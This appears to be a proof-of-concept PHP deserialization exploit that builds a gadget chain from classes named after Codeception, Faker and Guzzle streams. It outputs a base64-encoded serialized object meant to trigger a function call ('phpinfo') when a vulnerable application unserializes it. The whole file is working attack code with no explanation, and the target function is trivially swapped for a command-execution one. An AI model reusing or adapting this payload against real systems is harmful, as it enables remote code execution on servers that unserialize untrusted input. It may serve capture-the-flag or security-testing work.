<?php
namespace GuzzleHttp\Psr7{
    class PumpStream{
        private $source;
        public function __construct()
        {
            $this->source = 'phpinfo';
        }
    }


    class CachingStream{
        private $remoteStream;
        public function __construct()
        {
            $this->remoteStream = new PumpStream();
        }

    }


    class AppendStream{
        private $streams = [];
        public function __construct()
        {
            $this->streams = [new CachingStream()];
        }

    }



}

namespace Faker{
    use GuzzleHttp\Psr7\AppendStream;
    class DefaultGenerator{
        protected $default ;
        function __construct()
        {
            $this->default = new AppendStream();
        }
    }
}


namespace Codeception\Extension{
    use Faker\DefaultGenerator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this->processes = [new DefaultGenerator()];
        }

    }
}

namespace{
    use Codeception\Extension\RunProcess;

    echo base64_encode(serialize(new RunProcess()));
}

?>